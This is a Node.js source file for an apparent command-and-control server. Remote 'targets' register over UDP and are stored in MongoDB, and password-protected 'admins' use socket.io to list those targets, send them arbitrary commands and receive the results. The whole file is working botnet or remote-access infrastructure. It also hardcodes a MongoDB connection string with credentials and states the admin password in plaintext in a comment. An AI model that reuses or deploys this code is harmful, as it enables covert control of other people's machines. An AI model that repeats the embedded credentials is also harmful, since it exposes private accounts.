//main imports
const http = require('http'); //http
const socketIO = require('socket.io'); //socketio
const dgram = require('dgram'); //udp socket
const crypto = require('crypto'); //crypto hashing
const mongoose = require('mongoose'); //mongodb

//values (changebles)
const mongoDBConnectionString = 'mongodb+srv://xv:Eight8nine9@cluster0.gfv8vjt.mongodb.net/collections'; //connection string for mongodb
const origins =[]; //cors origin that are allowed
const PORT = process.env.PORT || 3000; //socket server port
const UDPPORT = 1509; //udp server port
const ROOM = "admins"; //socket io room name
const PASSWORD = "ca3b4eb87b7d126f8c283d782d6f94461d5878b3c6eb33c88a8128b103fd6226"; //socket io hashed (sha256) password (mightyxv15)
const hashMethod = 'sha256'; //hash method

//custom imports
const connectionModel = require('./custom/connectionSchema');//database schema
const commands = require('./custom/commands.json'); //platform commands collection

//initializations
const server = http.createServer(); //http server
const io = socketIO(server,{cors:{origin: "*",}}); //socket server : allows all  origin
const udpServer = dgram.createSocket('udp4'); //udpserver
mongoose.connect(mongoDBConnectionString, {}); //connecting to mongodb db


//(function) password match (crypto) : mathes password from socket.io before connecting
function matchPass(value){
    const hashedValue = crypto.createHash(hashMethod).update(value).digest('hex');
    if(hashedValue === PASSWORD)return true
    else return false  
}

// (middleware) socket.io middleware : checks if socket.io cllient password right o wrong (admin)
io.use((socket,next)=>{
    const password = socket.handshake.auth.password;
    if(matchPass(password)===true){
        console.log(`${socket.id} wants to join with right password`); //log
        socket.join(ROOM); //join room 
        next(); //to further procedure
    }else{
        console.log(`${socket.id} wants to join with wrong password`); //log
    }
});

//(event) socket io event
io.on('connection',(Socket)=>{
   console.log(`${Socket.id} connected successfully`); //log
   
    //(event) sends target details to admin when requested with 'getTarget'
    Socket.on('getTarget',()=>{
        connectionModel.find({},'ip port os name uniqueid').then((result)=>{
            Socket.emit('getTarget',result)//sending targets details to admins
        })
    });

    

    //sends the commands collection (json) from command.json file
    Socket.on('getCommand',()=>{
        Socket.emit('getCommand',commands)
    });

    //receives data from admins, forward it to the selected target
    Socket.on('exec',(data)=>{
        console.log(`socket : ${Socket.id} requested to send ${data.cmd} to ${data.target}`); //log
        //finding the ip and port of target to send from mongodb using uniqueid ,ie data.target
        connectionModel.findOne({uniqueid:data.target},"ip port").then((result)=>{
            console.log(`found target ${data.target} : ip - ${result.ip} port - ${result.port}`)//log
            
            //stringifying json data ,to make it ready to send to target
            jsonMsg = JSON.stringify({"cmd":data.cmd,"to":Socket.id})
            udpServer.send(jsonMsg,result.port,result.ip,(err)=>{
                if(!err){
                    console.log(`sent ${data.cmd} to target ${result.ip}:${result.port} from ${Socket.id}`); //log
                }
                else{
                    console.log(`couldn't send ${data.cmd} to target ${result.ip}:${result.port} from ${Socket.id} error: ${err}`); //log
                }
            })
        })
    });

    

    //when an admin socket is disconnected
    Socket.on('disconnect',()=>{
        console.log("socket disconnected")
    });
});

//udp server listening event
udpServer.on('listening',()=>{
    console.log(`UDP Server is running on port ${UDPPORT}`)
});

//udp server listen for any messages (outside socket.io)
udpServer.on('message',(data,remote)=>{
    console.log(data+"\n\n\n")
    var message = JSON.parse(data.toString()); //parsing message from target to json
    //type 'c' represents : when target want to connect
    if(message.type =='c'){
        //making an object for adding into database
        message.ip = remote.address
        message.port = remote.port
        message.date = new Date().getTime();
        message.lastTime = new Date().getTime();
    
        //check if target is already added to databse
        connectionModel.findOne({uniqueid:message.uniqueid}).then((document)=>{
            
            //documment == null represent user target is does not exist in databse
            if(document == null){ 

                //add target to database
                connectionModel.create(message)

                console.log(`target added : ${message.ip}:${message.port} os - ${message.os}`); //log
                
                //sending notifications to admins 
                io.to(ROOM).emit('notification',{"ip":remote.address,"port":remote.port,"os":message.os})
            }else{
                //updating target ip and port and lastseen time (lastTime)
                id = document._id;
                connectionModel.findOneAndUpdate({ _id: id }, { $set: { lastTime:new Date().getTime(),ip:remote.ip,port:remote.port } }, { new: true })
                .then(updatedDocument => {
                    console.log(`target connected : ip ${updatedDocument.ip} port : ${updatedDocument.port} time : ${updatedDocument.lastTime}`); //log
                    
                    io.to(ROOM).emit('notification',{"ip":remote.address,"port":remote.port,"os":message.os})
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            }
        });
    }
    //type 'r' represents : reply from target for the request from admin
    else if(message.type == "r"){
        console.log(`reply : from ${remote.address}:${remote.port} to ${message.to} : ${message.data}`); //log
        io.to(message.to).emit('reply',{result:message.data,from:remote.address})
    }

});

//bind udp server
udpServer.bind(UDPPORT);

//start socketio server
server.listen(PORT,()=>{
    console.log("Server is running on port "+PORT)
})